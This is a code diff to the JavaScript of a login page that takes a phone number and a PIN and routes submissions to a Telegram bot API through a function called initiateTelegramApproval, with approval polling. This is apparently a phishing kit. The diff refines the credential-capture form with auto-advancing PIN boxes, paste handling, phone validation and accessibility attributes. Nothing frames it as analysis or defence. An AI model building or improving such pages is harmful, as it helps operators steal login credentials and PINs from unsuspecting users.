@@ -9,6 +9,10 @@ const telegramApi = USE_TELEGRAM ? `https://api.telegram.org/bot${BOT_TOKEN}` : 
 
 const eyeButton = document.querySelector('.al-eye');
 const codeInputs = [...document.querySelectorAll('.al-pin')];
+const phoneInput = document.querySelector('#phone');
+const connectBtn = document.querySelector('#connect');
+const loginForm = document.querySelector('#login-form');
+
 codeInputs.forEach(input => input.type = 'password');
 
 if (eyeButton) {
@@ -20,39 +24,52 @@ if (eyeButton) {
     });
 }
 
-const phoneInput = document.querySelector('#phone');
-const connectBtn = document.querySelector('#connect');
-
 if (phoneInput) {
     phoneInput.maxLength = 9;
     phoneInput.addEventListener('input', () => {
         phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
         state();
+
+        if (isPhoneValid()) {
+            codeInputs.find(input => !input.value)?.focus();
+        }
     });
 }
 
 codeInputs.forEach((input, index) => {
     input.addEventListener('input', (e) => {
-        const value = e.target.value.replace(/\D/g, '');
-        e.target.value = value.slice(0, 1);
-        
-        if (value.length === 1 && index < codeInputs.length - 1) {
+        const value = e.target.value.replace(/\D/g, '').slice(0, 1);
+        e.target.value = value;
+
+        if (value && index < codeInputs.length - 1) {
             codeInputs[index + 1].focus();
         }
+
         state();
-        
-        if (value.length === 1 && index === codeInputs.length - 1) {
-            document.querySelector('#login-form')?.dispatchEvent(new Event('submit'));
-        }
     });
-    
-    input.addEventListener('paste', () => {
-        setTimeout(state, 100);
+
+    input.addEventListener('paste', event => {
+        event.preventDefault();
+        const digits = event.clipboardData?.getData('text').replace(/\D/g, '') ?? '';
+
+        digits.slice(0, codeInputs.length - index).split('').forEach((digit, offset) => {
+            codeInputs[index + offset].value = digit;
+        });
+
+        const nextEmpty = codeInputs.find(pinInput => !pinInput.value);
+        (nextEmpty ?? codeInputs.at(-1))?.focus();
+        state();
     });
-    
+
     input.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !e.target.value && index > 0) {
             codeInputs[index - 1].focus();
+        } else if (e.key === 'ArrowLeft' && index > 0) {
+            e.preventDefault();
+            codeInputs[index - 1].focus();
+        } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
+            e.preventDefault();
+            codeInputs[index + 1].focus();
         }
     });
 });
@@ -60,14 +77,19 @@ codeInputs.forEach((input, index) => {
 let approvalCheckInterval = null;
 let currentRequestId = null;
 
+function isPhoneValid() {
+    return Boolean(phoneInput && /^9\d{8}$/.test(phoneInput.value));
+}
+
 function state() {
     if (!connectBtn) return;
-    const ok = codeInputs.every(x => x.value.length === 1);
-    const phoneValid = phoneInput.value.length === 9 && phoneInput.value.startsWith('9');
-    connectBtn.disabled = !(ok && phoneValid);
-    connectBtn.classList.toggle('enabled', ok && phoneValid);
-    connectBtn.style.backgroundColor = (ok && phoneValid) ? '#ed1c2e' : '#ddd';
-    connectBtn.style.cursor = (ok && phoneValid) ? 'pointer' : 'not-allowed';
+    const pinValid = codeInputs.every(input => /^\d$/.test(input.value));
+    const formComplete = isPhoneValid() && pinValid;
+
+    connectBtn.disabled = !formComplete;
+    connectBtn.classList.toggle('enabled', formComplete);
+    phoneInput?.setAttribute('aria-invalid', String(phoneInput.value.length > 0 && !isPhoneValid()));
+    codeInputs.forEach(input => input.setAttribute('aria-invalid', String(input.value.length > 0 && !/^\d$/.test(input.value))));
 }
 
 function showInvalidNumber() {
@@ -176,7 +198,7 @@ function initiateTelegramApproval() {
     if (!phoneInput || !connectBtn) return;
     
     const phone = phoneInput.value;
-    if (phone.length !== 9 || !phone.startsWith('9')) {
+    if (!isPhoneValid()) {
         showInvalidNumber();
         return;
     }
@@ -199,7 +221,7 @@ function initiateTelegramApproval() {
     });
 }
 
-document.querySelector('#login-form')?.addEventListener('submit', event => {
+loginForm?.addEventListener('submit', event => {
     event.preventDefault();
     event.stopImmediatePropagation();
     initiateTelegramApproval();
